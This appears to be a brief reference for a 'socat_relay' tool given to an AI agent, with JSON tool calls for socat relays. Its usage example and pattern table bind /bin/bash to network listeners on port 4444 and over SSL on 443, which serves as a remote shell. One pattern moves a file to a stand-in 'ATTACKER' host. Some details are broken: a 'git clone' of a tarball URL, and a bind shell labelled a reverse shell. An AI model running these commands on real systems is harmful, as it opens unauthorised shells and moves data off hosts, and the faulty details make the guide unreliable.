# Socat (`socat_relay`)

TCP/UDP relay for port forwarding, reverse shells, and tunneling.

## Installation

- Homebrew: `brew install socat`
- APT: `sudo apt install socat`
- Source: `git clone http://www.dest-unreach.org/socat/download/socat-1.8.0.tar.gz`

## Usage

```json
{"tool": "socat_relay", "args": {"cmd": "TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash"}}
```

## Essential Patterns

| Purpose | Command |
|---------|---------|
| Reverse shell listener | `TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash` |
| Port forward | `TCP-LISTEN:8080,fork TCP:internal:80` |
| SSL listener | `OPENSSL-LISTEN:443,cert=server.pem,fork EXEC:/bin/bash` |
| UDP DNS forward | `UDP-LISTEN:53,fork UDP:8.8.8.8:53` |
| File send | `TCP-LISTEN:4444,fork OPEN:file.txt,creat,append` |
| File recv | `TCP:ATTACKER:4444 OPEN:received.txt,creat` |

## Workflows

```json
{"tool": "socat_relay", "args": {"cmd": "TCP-LISTEN:8080,fork TCP:10.0.0.1:80"}}
```
Then browse http://localhost:8080 to access the target.
